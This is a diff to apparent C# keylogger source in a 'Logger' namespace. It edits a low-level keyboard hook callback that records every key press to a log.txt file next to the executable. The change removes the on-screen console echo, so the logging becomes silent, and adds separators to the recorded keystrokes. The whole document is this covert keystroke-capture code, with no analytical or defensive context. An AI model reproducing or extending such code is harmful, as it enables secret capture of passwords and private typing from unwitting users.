@@ -1,4 +1,4 @@
-﻿/*
+/*
  * 
  * Felipe Bocolowski
  * felipebocolowski@outlook.com.br
@@ -53,11 +53,14 @@ namespace Logger
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                Console.WriteLine((Keys)vkCode);
-                StreamWriter sw = new StreamWriter(System.IO.Path.GetDirectoryName(Application.ExecutablePath) + @"\log.txt", true);
-                sw.Write((Keys)vkCode);
+
+                StreamWriter sw = new StreamWriter(Path.GetDirectoryName(Application.ExecutablePath) + @"\log.txt", true);
+
+                sw.Write((Keys)vkCode + " ");
+
                 sw.Close();
             }
+
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
